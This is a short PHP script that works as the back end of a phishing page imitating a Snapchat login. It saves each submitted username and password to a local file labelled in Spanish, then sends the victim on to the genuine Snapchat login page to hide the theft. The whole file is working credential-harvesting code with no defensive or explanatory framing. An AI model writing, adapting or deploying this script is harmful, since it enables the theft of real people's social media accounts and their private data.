<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['username'] . " Clave: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/login');
exit();
